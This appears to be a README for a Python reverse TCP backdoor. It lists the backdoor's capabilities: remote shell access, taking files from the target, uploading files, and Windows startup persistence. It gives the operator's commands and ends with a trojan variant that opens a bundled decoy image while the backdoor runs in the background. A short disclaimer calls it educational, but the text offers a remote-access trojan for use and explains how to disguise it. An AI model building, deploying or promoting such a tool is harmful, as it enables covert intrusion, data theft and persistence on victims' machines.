This is an implementation of Reverse TCP Backdoor Written in Python3. It works on Windows as well as Linux OS.
This Backdoor has following features:
Command-Line Access to Target Machine.
Grab any file from Target Machine.
Transfer any file from Attacker to Target Machine.
Put any file in startup directory of Target running Windows OS.
  
    
USAGE:
grab [Filename]:      To copy a file from target machine to attacker machine.
cd [DIR]:             To change directory.
transfer [Filename]:  To transfer file from attacker machine to target machine.
startup [filename]:   To put a file in startup registery of target machine (only Windows).
terminate:            To terminate the exploit on both ends.
  
CMD and Terminal commands also work as per target OS.

NOTE: This backdoor is for understanding TCP Connections between Computers. Use of these scripts to illegal activities is not permitted.
NOTE: Use this program at your own risk. I will not be resposible for any illegal activity performed using this program.

WITH MAIN_WITH_IMG
with the main_with_img 
it opens the file u attach while compiling the python file to exe 
then execute the backdoor code
example the Assignment.pmg was attaached while compiling the py file to exe with the autopytoexe.exe
